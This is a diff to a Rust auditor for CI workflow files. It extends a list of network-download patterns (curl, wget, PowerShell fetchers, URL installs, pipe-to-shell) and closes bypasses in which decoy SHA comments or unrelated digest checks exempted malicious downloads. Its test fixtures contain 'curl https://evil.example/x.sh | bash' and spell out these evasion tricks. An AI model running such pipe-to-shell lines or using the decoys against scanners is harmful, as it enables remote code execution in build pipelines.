@@ -22,14 +22,23 @@ use super::{AuditFinding, Severity, key_jobs, key_on, key_permissions, key_run, 
 const EXTERNAL_DOWNLOAD_PATTERNS: &[(&str, &str)] = &[
     ("curl -", "curl"),
     ("curl ", "curl"),
+    ("curl.exe ", "curl.exe"),
     ("wget ", "wget"),
+    ("wget2 ", "wget2"),
+    ("aria2c ", "aria2c"),
     ("gh release download", "gh release download"),
     ("pip install -r https://", "pip install URL"),
     ("pip install https://", "pip install URL"),
     ("pip install git+https://", "pip install git+URL"),
+    ("pip3 install https://", "pip3 install URL"),
+    ("pip3 install git+https://", "pip3 install git+URL"),
+    ("-m pip install https://", "python -m pip install URL"),
+    ("-m pip install git+https://", "python -m pip install git+URL"),
     ("npm install https://", "npm install URL"),
     ("npm install git+https://", "npm install git+URL"),
     ("npm install --registry ", "npm install --registry"),
+    ("npm i https://", "npm i URL"),
+    ("npm i git+https://", "npm i git+URL"),
     ("yarn add https://", "yarn add URL"),
     ("go install ", "go install"),
     ("go get ", "go get"),
@@ -40,6 +49,11 @@ const EXTERNAL_DOWNLOAD_PATTERNS: &[(&str, &str)] = &[
     ("sh -c \"$(curl", "sh -c curl"),
     ("| bash", "curl | bash"),
     ("| sh", "curl | sh"),
+    // PowerShell fetchers on Windows runners.
+    ("invoke-webrequest ", "Invoke-WebRequest"),
+    ("invoke-restmethod ", "Invoke-RestMethod"),
+    ("iwr ", "iwr"),
+    ("irm ", "irm"),
 ];
 
 /// URLs/hosts we treat as GitHub-upstream. Matches against run: bodies;
@@ -108,7 +122,7 @@ fn check_workflow(file: &Path, doc: &Yaml, findings: &mut Vec<AuditFinding>, is_
     }
 }
 
-fn check_run_block(
+pub(super) fn check_run_block(
     file: &Path,
     run: &str,
     pr_triggered: bool,
@@ -116,28 +130,36 @@ fn check_run_block(
     findings: &mut Vec<AuditFinding>,
     is_warning: bool,
 ) {
-    let lower = run.to_ascii_lowercase();
+    // Normalize tabs to spaces so a tab-separated `curl\t-fsSL` still matches
+    // the space-delimited download patterns.
+    let lower = run.to_ascii_lowercase().replace('\t', " ");
+    let block_has_digest = has_inline_digest_verification(&lower);
+
+    // Scan line by line so an exemption covers only the download it actually
+    // applies to. Previously a decoy SHA-pinned URL in a comment, or an
+    // unrelated `sha256sum --check` anywhere in the block, silenced a real
+    // malicious download sitting beside it.
     let mut hit: Option<&'static str> = None;
-    for (needle, label) in EXTERNAL_DOWNLOAD_PATTERNS {
-        if contains_word_bounded(&lower, needle) {
-            hit = Some(label);
-            break;
+    for line in lower.lines() {
+        let Some(label) = download_label_for_line(line) else {
+            continue;
+        };
+        // A SHA-pinned GitHub URL on THIS line is provenance-equivalent to
+        // `uses:@<sha>`; a pin elsewhere in the block no longer counts.
+        if is_github_sha_pinned(line) {
+            continue;
         }
+        // A digest check only covers downloads that write an artifact to disk.
+        // A pipe-to-shell (`curl | bash`, `bash <(curl)`) executes immediately
+        // and can't be checksum-verified, so it is never exempted by a digest
+        // line — that is exactly the decoy an attacker would add.
+        if block_has_digest && !is_pipe_to_shell(line) {
+            continue;
+        }
+        hit = Some(label);
+        break;
     }
     let Some(label) = hit else { return };
-
-    // Bail if the run: is pulling a GitHub raw URL that's SHA-pinned; the
-    // pinning already provides provenance equivalent to `uses:@<sha>`.
-    if is_github_sha_pinned(&lower) {
-        return;
-    }
-
-    // Bail if the block verifies the artifact against an inline digest --
-    // exactly the remediation this check recommends. A tampered upstream
-    // fails the comparison and the step aborts before execution.
-    if has_inline_digest_verification(&lower) {
-        return;
-    }
 
     // An external download with no SHA in a workflow that writes / uses
     // secrets / is PR-triggered is the full attack story.
@@ -190,6 +212,29 @@ fn contains_word_bounded(haystack: &str, needle: &str) -> bool {
         search_from = start + 1;
     }
     false
+}
+
+/// Return the label of the first download pattern that matches this single
+/// line (word-bounded), or `None`.
+fn download_label_for_line(line: &str) -> Option<&'static str> {
+    for (needle, label) in EXTERNAL_DOWNLOAD_PATTERNS {
+        if contains_word_bounded(line, needle) {
+            return Some(label);
+        }
+    }
+    None
+}
+
+/// True when a line pipes/substitutes a fetch straight into a shell. Such a
+/// download executes the moment it arrives, so no inline digest check can gate
+/// it — only SHA-pinning the source URL makes it safe.
+fn is_pipe_to_shell(line: &str) -> bool {
+    line.contains("| bash")
+        || line.contains("| sh")
+        || line.contains("<(curl")
+        || line.contains("<(wget")
+        || line.contains("$(curl")
+        || line.contains("$(wget")
 }
 
 /// Detect an inline digest check covering the downloaded artifact: a
@@ -253,22 +298,31 @@ fn workflow_has_pr_trigger(on_val: Option<&Yaml>) -> bool {
     };
     #[allow(clippy::wildcard_enum_match_arm)]
     match on {
-        Yaml::String(s) => matches!(
-            s.as_str(),
-            "pull_request" | "pull_request_target" | "issue_comment"
-        ),
-        Yaml::Array(arr) => arr.iter().any(|v| {
-            v.as_str().is_some_and(|s| {
-                matches!(s, "pull_request" | "pull_request_target" | "issue_comment")
-            })
-        }),
-        Yaml::Hash(map) => map.keys().any(|k| {
-            k.as_str().is_some_and(|s| {
-                matches!(s, "pull_request" | "pull_request_target" | "issue_comment")
-            })
-        }),
+        Yaml::String(s) => is_attacker_influenced_trigger(s),
+        Yaml::Array(arr) => arr
+            .iter()
+            .any(|v| v.as_str().is_some_and(is_attacker_influenced_trigger)),
+        Yaml::Hash(map) => map
+            .keys()
+            .any(|k| k.as_str().is_some_and(is_attacker_influenced_trigger)),
         _ => false,
     }
+}
+
+/// Triggers whose payload/upstream can be influenced by an outside contributor,
+/// making an unpinned download in the same workflow more dangerous. Includes
+/// `workflow_run` (fires off an upstream that may itself be fork-PR triggered)
+/// and the `pull_request_review*` family.
+fn is_attacker_influenced_trigger(name: &str) -> bool {
+    matches!(
+        name,
+        "pull_request"
+            | "pull_request_target"
+            | "pull_request_review"
+            | "pull_request_review_comment"
+            | "issue_comment"
+            | "workflow_run"
+    )
 }
 
 fn top_level_privileged(perm_val: Option<&Yaml>) -> bool {
@@ -353,6 +407,60 @@ jobs:
                 .iter()
                 .any(|f| f.title.contains("external artifact download")),
             "SHA-pinned GitHub raw URL should not be flagged: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn decoy_sha_comment_does_not_exempt_malicious_download() {
+        // A SHA-pinned GitHub URL in a comment on another line must NOT silence
+        // a real unpinned pipe-to-shell download beside it.
+        let doc = parse(
+            "
+on: pull_request_target
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # see https://github.com/actions/checkout/commit/8f4b7f84864484a7bf31766abe9204da3cbe65b3
+          curl https://evil.example/x.sh | bash
+",
+        );
+        let findings = run_check(&doc);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.title.contains("external artifact download")),
+            "decoy SHA comment must not exempt the malicious download: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn decoy_unrelated_digest_check_does_not_exempt_pipe_to_shell() {
+        // An unrelated `sha256sum --check` cannot cover a pipe-to-shell download
+        // (which executes immediately), so the download must still be flagged.
+        let doc = parse(
+            "
+on: pull_request_target
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl https://evil.example/x.sh | bash
+          echo '0000000000000000000000000000000000000000000000000000000000000000  README' | sha256sum --check
+",
+        );
+        let findings = run_check(&doc);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.title.contains("external artifact download")),
+            "unrelated digest check must not exempt a pipe-to-shell download: {findings:?}"
         );
     }
 
